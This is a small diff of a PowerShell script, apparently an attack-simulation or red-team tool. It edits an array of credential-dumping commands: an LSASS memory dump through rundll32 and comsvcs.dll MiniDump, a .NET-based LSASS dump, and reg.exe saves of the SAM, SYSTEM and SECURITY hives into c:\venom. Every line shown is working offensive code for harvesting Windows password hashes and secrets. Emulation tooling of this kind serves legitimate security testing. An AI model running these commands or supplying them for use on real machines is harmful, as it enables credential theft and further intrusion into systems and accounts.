@@ -71,7 +71,7 @@ function Invoke-CommandArray {
 
 
 $cred_commands = @('$sassy_pid = Get-Process lsass | Select Id -ExpandProperty Id; c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump $sassy_pid c:\venom\lsass.dmp full',
-	'Get-Process lsass | ForEach-Object {$proc = [System.Diagnostics.Process]::GetProcessById($_.Id); $dumpFile="C:\venom\lsass.dmp"',
+	'Get-Process lsass | ForEach-Object {$proc = [System.Diagnostics.Process]::GetProcessById($_.Id); $dumpFile="C:\venom\lsass-2.dmp"',
 	'c:\windows\system32\reg.exe save HKLM\SAM c:\venom\sam.save',
 	'c:\windows\system32\reg.exe save HKLM\SYSTEM c:\venom\system.save',
 	'c:\windows\system32\reg.exe save HKLM\SECURITY c:\venom\security.save')
